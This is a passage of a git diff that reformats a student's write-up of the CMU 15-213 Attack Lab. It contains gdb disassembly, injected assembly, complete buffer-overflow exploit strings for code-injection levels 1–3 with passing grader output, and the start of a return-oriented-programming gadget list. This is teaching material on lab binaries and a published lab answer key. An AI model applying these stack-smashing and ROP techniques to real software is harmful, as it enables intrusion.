@@ -87,7 +87,15 @@ Just like what we saw in the description of **code injection attack**, the thing
 For more detail, let's look the assembly code of `getbuf()` (In `ctarget`):
 
 ```asm
-(gdb) disas getbuf Dump of assembler code for function getbuf:   0x00000000004017a8 <+0>:	sub    $0x28,%rsp   0x00000000004017ac <+4>:	mov    %rsp,%rdi   0x00000000004017af <+7>:	callq  0x401a40 <Gets>   0x00000000004017b4 <+12>:	mov    $0x1,%eax   0x00000000004017b9 <+17>:	add    $0x28,%rsp   0x00000000004017bd <+21>:	retq   End of assembler dump.
+(gdb) disas getbuf 
+Dump of assembler code for function getbuf:
+   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
+   0x00000000004017ac <+4>:	mov    %rsp,%rdi
+   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
+   0x00000000004017b4 <+12>:	mov    $0x1,%eax
+   0x00000000004017b9 <+17>:	add    $0x28,%rsp
+   0x00000000004017bd <+21>:	retq   
+End of assembler dump.
 ```
 
 As the code shown us, the function `getbuf()` request 0x28 (40 in Decimal) bytes spaces for the input buffer, and then return back the to the `test()`. Note that there is no arguement passed into `getbuf()`. Thus, we just need to make sure that if our input string longer than 40, then we can overwrite the return area of `getbuf()`, where ,by overwrite the return area of `getbuf()`, the program will not jump back to `test()`, but the address we point to. Since we are using 64-bit machine, **the length of return address should be 8 bytes.** Also, we pass the target address as a data, and thus it should follow the **order of little endian**.
@@ -95,10 +103,21 @@ As the code shown us, the function `getbuf()` request 0x28 (40 in Decimal) bytes
 For better understand the layout of stack frame, we firstly print the stack frame range of `getbuf()`, where it prints the address of `%rsp` before and after called `Gets()`:
 
 ```bash
-(gdb) i r rsprsp            0x5561dca0	0x5561dca0(gdb) ni14	in buf.c(gdb) i r rsprsp            0x5561dc78	0x5561dc78```
+(gdb) i r rsp
+rsp            0x5561dca0	0x5561dca0
+(gdb) ni
+14	in buf.c
+(gdb) i r rsp
+rsp            0x5561dc78	0x5561dc78
+```
 Then, we use a legal but distinguishable input string as input string to `ctarget` and we print the layout of the stack frame for `getbuf` after call `Gets()`.
 
-```bash01 02 03 04 05 06 07 08 11 12 13 14 15 16 17 1821 22 23 24 25 26 27 2831 32 33 34 35 36 37 3841 42 43 44 45 46 47
+```bash
+01 02 03 04 05 06 07 08 
+11 12 13 14 15 16 17 18
+21 22 23 24 25 26 27 28
+31 32 33 34 35 36 37 38
+41 42 43 44 45 46 47
 ```
 We will get the layout like this:
 ![stack_frame_layout_for_getbuf](pic/stack_frame_layout_for_getbuf.png)
@@ -106,13 +125,36 @@ We will get the layout like this:
 Here is the assembly code for `test()`:
 
 ```asm
-(gdb) disas testDump of assembler code for function test:   0x0000000000401968 <+0>:	sub    $0x8,%rsp   0x000000000040196c <+4>:	mov    $0x0,%eax   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>   0x0000000000401976 <+14>:	mov    %eax,%edx ; the place should have jumped back to   0x0000000000401978 <+16>:	mov    $0x403188,%esi   0x000000000040197d <+21>:	mov    $0x1,%edi   0x0000000000401982 <+26>:	mov    $0x0,%eax   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>   0x000000000040198c <+36>:	add    $0x8,%rsp   0x0000000000401990 <+40>:	retq   End of assembler dump.
+(gdb) disas test
+Dump of assembler code for function test:
+   0x0000000000401968 <+0>:	sub    $0x8,%rsp
+   0x000000000040196c <+4>:	mov    $0x0,%eax
+   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
+   0x0000000000401976 <+14>:	mov    %eax,%edx ; the place should have jumped back to
+   0x0000000000401978 <+16>:	mov    $0x403188,%esi
+   0x000000000040197d <+21>:	mov    $0x1,%edi
+   0x0000000000401982 <+26>:	mov    $0x0,%eax
+   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
+   0x000000000040198c <+36>:	add    $0x8,%rsp
+   0x0000000000401990 <+40>:	retq   
+End of assembler dump.
 ```
 
 Moreover, we can get the adderss of `touch1()` by seeing its assembly code, which is `0x4017c0`.
 
 ```asm
-(gdb) disas touch1 Dump of assembler code for function touch1:   0x00000000004017c0 <+0>:	sub    $0x8,%rsp ; the begin address of touch1()   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>   0x00000000004017d8 <+24>:	mov    $0x1,%edi   0x00000000004017dd <+29>:	callq  0x401c8d <validate>   0x00000000004017e2 <+34>:	mov    $0x0,%edi   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>End of assembler dump.(gdb) 
+(gdb) disas touch1 
+Dump of assembler code for function touch1:
+   0x00000000004017c0 <+0>:	sub    $0x8,%rsp ; the begin address of touch1()
+   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
+   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
+   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
+   0x00000000004017d8 <+24>:	mov    $0x1,%edi
+   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
+   0x00000000004017e2 <+34>:	mov    $0x0,%edi
+   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
+End of assembler dump.
+(gdb) 
 ```
 
 Here is our code injection payload:
@@ -131,7 +173,15 @@ Finally, we need to use the program `hex2raw` to convert our input string to the
 we have successfully made the program jump to `touch 1()` in the final.
 
 ```bash
-➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level1.txt | ./ctarget -q Cookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level1.txt | ./ctarget -q 
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
 	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
 ```
 
@@ -163,7 +213,28 @@ Thus, in CI-Level2, we have two main goal
 Here is the assemly code of `touch2`:
 
 ```asm
-00000000004017ec <touch2>:  4017ec:	48 83 ec 08          	sub    $0x8,%rsp  4017f0:	89 fa                	mov    %edi,%edx  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>  4017f9:	00 00 00   4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>  401802:	75 20                	jne    401824 <touch2+0x38>  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi  401809:	bf 01 00 00 00       	mov    $0x1,%edi  40180e:	b8 00 00 00 00       	mov    $0x0,%eax  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>  401818:	bf 02 00 00 00       	mov    $0x2,%edi  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>  401822:	eb 1e                	jmp    401842 <touch2+0x56>  401824:	be 10 31 40 00       	mov    $0x403110,%esi  401829:	bf 01 00 00 00       	mov    $0x1,%edi  40182e:	b8 00 00 00 00       	mov    $0x0,%eax  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>  401838:	bf 02 00 00 00       	mov    $0x2,%edi  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>  401842:	bf 00 00 00 00       	mov    $0x0,%edi  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
+00000000004017ec <touch2>:
+  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
+  4017f0:	89 fa                	mov    %edi,%edx
+  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
+  4017f9:	00 00 00 
+  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
+  401802:	75 20                	jne    401824 <touch2+0x38>
+  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
+  401809:	bf 01 00 00 00       	mov    $0x1,%edi
+  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
+  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
+  401818:	bf 02 00 00 00       	mov    $0x2,%edi
+  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
+  401822:	eb 1e                	jmp    401842 <touch2+0x56>
+  401824:	be 10 31 40 00       	mov    $0x403110,%esi
+  401829:	bf 01 00 00 00       	mov    $0x1,%edi
+  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
+  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
+  401838:	bf 02 00 00 00       	mov    $0x2,%edi
+  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
+  401842:	bf 00 00 00 00       	mov    $0x0,%edi
+  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
 ```
 
 First, we can see the the first address of `touch2` should be `0x4017ec`. Then, we also find that the variable we pass to `touch2` should be stored at `$rdi`.
@@ -172,8 +243,10 @@ To make `$rdi` store our cookie, we need to inject the exploit string, which con
 
 The assemly code we made just like below:
 
-```asmmovq  $0x59b997fa,%rdi ; make rdi store our cookie value
-pushq $0x4017ec ; push the address of touch 2 into the stackretq ; return to touch2()
+```asm
+movq  $0x59b997fa,%rdi ; make rdi store our cookie value
+pushq $0x4017ec ; push the address of touch 2 into the stack
+retq ; return to touch2()
 ```
 After that:
 
@@ -181,7 +254,14 @@ After that:
 2. then use `objdump -d injection_code.o > injection_code.txt` reverse this object file to generate the `Hexadecimal Code`.
 
 ```asm
-injection_code.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 <.text>:   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi   7:	68 ec 17 40 00       	pushq  $0x4017ec   c:	c3                   	retq  ; use return instruction to jump to tourch2
+injection_code.o:     file format elf64-x86-64
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	68 ec 17 40 00       	pushq  $0x4017ec
+   c:	c3                   	retq  ; use return instruction to jump to tourch2
 
 ```
 **We will use this hexadecimal code as part of the exploit string to mislead the program into thinking that these input characters are assembly instructions，where it is the code we will inject into the program.**
@@ -195,13 +275,26 @@ Next, our goal is how to arrange the layout of the input exploit string to misle
 Here is final exploit string:
 
 ```
-48 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00
+48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
 ```
 
 We pass the test:
 
 ```bash
-➜ ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 
+➜ ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 
 	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
 ```
 
@@ -210,13 +303,28 @@ The **Second way** is to **not only overwrite the next 8 bytes address, but next
 The exploit string should be like this:
 
 ```
-00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00a8 dc 61 55 00 00 00 0048 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+a8 dc 61 55 00 00 00 00
+48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3 00 00 00
 ```
 
 Also pass the test:
 
 ```bash
-➜ ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+➜ ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level2/CI_Level2.txt | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 			 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A8 DC 61 55 
 	 		 00 00 00 00 48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 
 ```
@@ -284,7 +392,33 @@ Hex  Char
 Here is the assembly code of `touch3`:
 
 ```asm
-00000000004018fa <touch3>:  4018fa:	53                   	push   %rbx  4018fb:	48 89 fb             	mov    %rdi,%rbx  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>  401905:	00 00 00   401908:	48 89 fe             	mov    %rdi,%rsi  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>  401916:	85 c0                	test   %eax,%eax  401918:	74 23                	je     40193d <touch3+0x43>  40191a:	48 89 da             	mov    %rbx,%rdx  40191d:	be 38 31 40 00       	mov    $0x403138,%esi  401922:	bf 01 00 00 00       	mov    $0x1,%edi  401927:	b8 00 00 00 00       	mov    $0x0,%eax  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>  401931:	bf 03 00 00 00       	mov    $0x3,%edi  401936:	e8 52 03 00 00       	callq  401c8d <validate>  40193b:	eb 21                	jmp    40195e <touch3+0x64>  40193d:	48 89 da             	mov    %rbx,%rdx  401940:	be 60 31 40 00       	mov    $0x403160,%esi  401945:	bf 01 00 00 00       	mov    $0x1,%edi  40194a:	b8 00 00 00 00       	mov    $0x0,%eax  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>  401954:	bf 03 00 00 00       	mov    $0x3,%edi  401959:	e8 f1 03 00 00       	callq  401d4f <fail>  40195e:	bf 00 00 00 00       	mov    $0x0,%edi  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
+00000000004018fa <touch3>:
+  4018fa:	53                   	push   %rbx
+  4018fb:	48 89 fb             	mov    %rdi,%rbx
+  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
+  401905:	00 00 00 
+  401908:	48 89 fe             	mov    %rdi,%rsi
+  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
+  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
+  401916:	85 c0                	test   %eax,%eax
+  401918:	74 23                	je     40193d <touch3+0x43>
+  40191a:	48 89 da             	mov    %rbx,%rdx
+  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
+  401922:	bf 01 00 00 00       	mov    $0x1,%edi
+  401927:	b8 00 00 00 00       	mov    $0x0,%eax
+  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
+  401931:	bf 03 00 00 00       	mov    $0x3,%edi
+  401936:	e8 52 03 00 00       	callq  401c8d <validate>
+  40193b:	eb 21                	jmp    40195e <touch3+0x64>
+  40193d:	48 89 da             	mov    %rbx,%rdx
+  401940:	be 60 31 40 00       	mov    $0x403160,%esi
+  401945:	bf 01 00 00 00       	mov    $0x1,%edi
+  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
+  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
+  401954:	bf 03 00 00 00       	mov    $0x3,%edi
+  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
+  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
+  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
 ```
 
 **We can see that the first address of `touch3()` is `0x4018fa`.**
@@ -292,7 +426,56 @@ Here is the assembly code of `touch3`:
 Here is the assembly code of `hexmatch`
 
 ```asm
-000000000040184c <hexmatch>:  40184c:	41 54                	push   %r12  40184e:	55                   	push   %rbp  40184f:	53                   	push   %rbx  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp  401854:	41 89 fc             	mov    %edi,%r12d  401857:	48 89 f5             	mov    %rsi,%rbp  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax  401861:	00 00   401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)  401868:	31 c0                	xor    %eax,%eax  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>  40186f:	48 89 c1             	mov    %rax,%rcx  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx  401879:	0a d7 a3   40187c:	48 f7 ea             	imul   %rdx  40187f:	48 01 ca             	add    %rcx,%rdx  401882:	48 c1 fa 06          	sar    $0x6,%rdx  401886:	48 89 c8             	mov    %rcx,%rax  401889:	48 c1 f8 3f          	sar    $0x3f,%rax  40188d:	48 29 c2             	sub    %rax,%rdx  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax  401898:	48 c1 e0 02          	shl    $0x2,%rax  40189c:	48 29 c1             	sub    %rax,%rcx  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx  4018a3:	45 89 e0             	mov    %r12d,%r8d  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx  4018b2:	be 01 00 00 00       	mov    $0x1,%esi  4018b7:	48 89 df             	mov    %rbx,%rdi  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax  4018bf:	e8 ac f5 ff ff       	callq  400e70 <__sprintf_chk@plt>  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx  4018c9:	48 89 de             	mov    %rbx,%rsi  4018cc:	48 89 ef             	mov    %rbp,%rdi  4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>  4018d4:	85 c0                	test   %eax,%eax  4018d6:	0f 94 c0             	sete   %al  4018d9:	0f b6 c0             	movzbl %al,%eax  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi  4018e8:	00 00   4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>  4018ec:	e8 ef f3 ff ff       	callq  400ce0 <__stack_chk_fail@plt>  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp  4018f5:	5b                   	pop    %rbx  4018f6:	5d                   	pop    %rbp  4018f7:	41 5c                	pop    %r12  4018f9:	c3                   	retq   
+000000000040184c <hexmatch>:
+  40184c:	41 54                	push   %r12
+  40184e:	55                   	push   %rbp
+  40184f:	53                   	push   %rbx
+  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
+  401854:	41 89 fc             	mov    %edi,%r12d
+  401857:	48 89 f5             	mov    %rsi,%rbp
+  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+  401861:	00 00 
+  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
+  401868:	31 c0                	xor    %eax,%eax
+  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>
+  40186f:	48 89 c1             	mov    %rax,%rcx
+  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
+  401879:	0a d7 a3 
+  40187c:	48 f7 ea             	imul   %rdx
+  40187f:	48 01 ca             	add    %rcx,%rdx
+  401882:	48 c1 fa 06          	sar    $0x6,%rdx
+  401886:	48 89 c8             	mov    %rcx,%rax
+  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
+  40188d:	48 29 c2             	sub    %rax,%rdx
+  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
+  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
+  401898:	48 c1 e0 02          	shl    $0x2,%rax
+  40189c:	48 29 c1             	sub    %rax,%rcx
+  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
+  4018a3:	45 89 e0             	mov    %r12d,%r8d
+  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
+  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
+  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
+  4018b7:	48 89 df             	mov    %rbx,%rdi
+  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
+  4018bf:	e8 ac f5 ff ff       	callq  400e70 <__sprintf_chk@plt>
+  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
+  4018c9:	48 89 de             	mov    %rbx,%rsi
+  4018cc:	48 89 ef             	mov    %rbp,%rdi
+  4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>
+  4018d4:	85 c0                	test   %eax,%eax
+  4018d6:	0f 94 c0             	sete   %al
+  4018d9:	0f b6 c0             	movzbl %al,%eax
+  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
+  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
+  4018e8:	00 00 
+  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
+  4018ec:	e8 ef f3 ff ff       	callq  400ce0 <__stack_chk_fail@plt>
+  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
+  4018f5:	5b                   	pop    %rbx
+  4018f6:	5d                   	pop    %rbp
+  4018f7:	41 5c                	pop    %r12
+  4018f9:	c3                   	retq   
 ```
 
 Just like what we did in CI-Level2, the return address of `getbuf()` should be overwritten by the first address where the injected code is placed. However, another difference from CI-Level2 is that the parameter passed to `$rdi `should not be the cookie value itself, but **the first address where the cookie string is stored**.
@@ -302,19 +485,32 @@ To avoid the stack frame of `hexmatch` overwritten our exploit string, due to th
 Here is our code:
 
 ```asm
-mov $0x5561dca8, %rdi // pass the address that store the cookie string in to rdipushq $0x4018fa // push the addr of touch3 into stackretq // return to touch 3
+mov $0x5561dca8, %rdi // pass the address that store the cookie string in to rdi
+pushq $0x4018fa // push the addr of touch3 into stack
+retq // return to touch 3
 ```
 
 After using the `gcc -c code_injection.S` and `objdump -d code_injection.S > code_injection.txt`, we get the `Hexadecimal Code`.
 
 ```bash
-code_injection.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 <.text>:   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi   7:	68 fa 18 40 00       	pushq  $0x4018fa   c:	c3                   	retq 
+code_injection.o:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
+   7:	68 fa 18 40 00       	pushq  $0x4018fa
+   c:	c3                   	retq 
 ```
 
 Here is my final exploit string:
 
 ```
-48 c7 c7 a8 dc 61 55 68		<- 0x5561dc78 : the top the stack frame for getbuffa 18 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 	<- Jump to 0x5561dc78
+48 c7 c7 a8 dc 61 55 68		<- 0x5561dc78 : the top the stack frame for getbuf
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 	<- Jump to 0x5561dc78
 35 39 62 39 39 37 66 61		<- The position store the cookie string(0x5561dca8)
 00
 ```
@@ -322,7 +518,15 @@ Here is my final exploit string:
 We finally pass the test:
 
 ```bash
-➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level3/CI_Level3.txt | ./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3("59b997fa")Valid solution for level 3 with target ctargetPASS: Would have posted the following:	user id	bovik	course	15213-f15	lab	attacklab	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00
+➜  ~/cmu-15-213-CSAPP3E-lab/3.Attack_lab/target1 ./hex2raw < solutions/CI_Level3/CI_Level3.txt | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00
 	 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
 ```
 
@@ -350,8 +554,10 @@ Here is the common `hexadecimal code` that can be used as gadget:
 ###  2.1 Level 2
 Just like what we did in phase2(CI-Level2), we need to store the cookie value into `rdi` and then jump to `touch2()`.
 
-```asmmovq  $0x59b997fa,%rdi ; make rdi store our cookie value
-pushq $0x4017ec ; push the address of touch 2 into the stackretq ; return to touch2()
+```asm
+movq  $0x59b997fa,%rdi ; make rdi store our cookie value
+pushq $0x4017ec ; push the address of touch 2 into the stack
+retq ; return to touch2()
 ```
 
 However, as we described above, due to ASLR (Address Space Layout Randomization) and non-executable code segments, we cannot directly inject code as in the previous section. Instead, we can use RoP to collect the existing gadgets in the current program and link them together to achieve our goal, where the gadget is actually a sequence of "hexadecimal codes" that representing executable assembly code.
@@ -361,7 +567,45 @@ It is hard to achieve the assembly code like above, but we can change the assemb
 Avaliable gadget from `farm` or dissasemble by `rtarget`:
 
 ```asm
-0000000000401994 <start_farm>:  401994:	b8 01 00 00 00       	mov    $0x1,%eax  401999:	c3                   	retq   000000000040199a <getval_142>:  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax  40199f:	c3                   	retq   00000000004019a0 <addval_273>:  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax  4019a6:	c3                   	retq   00000000004019a7 <addval_219>:  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax  4019ad:	c3                   	retq   00000000004019ae <setval_237>:  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)  4019b4:	c3                   	retq   00000000004019b5 <setval_424>:  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)  4019bb:	c3                   	retq   00000000004019bc <setval_470>:  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)  4019c2:	c3                   	retq   00000000004019c3 <setval_426>:  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)  4019c9:	c3                   	retq   00000000004019ca <getval_280>:  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax  4019cf:	c3                   	retq   00000000004019d0 <mid_farm>:  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax  4019d5:	c3                   	retq 
+0000000000401994 <start_farm>:
+  401994:	b8 01 00 00 00       	mov    $0x1,%eax
+  401999:	c3                   	retq   
+
+000000000040199a <getval_142>:
+  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
+  40199f:	c3                   	retq   
+
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+00000000004019ae <setval_237>:
+  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
+  4019b4:	c3                   	retq   
+
+00000000004019b5 <setval_424>:
+  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
+  4019bb:	c3                   	retq   
+
+00000000004019bc <setval_470>:
+  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
+  4019c2:	c3                   	retq   
+
+00000000004019c3 <setval_426>:
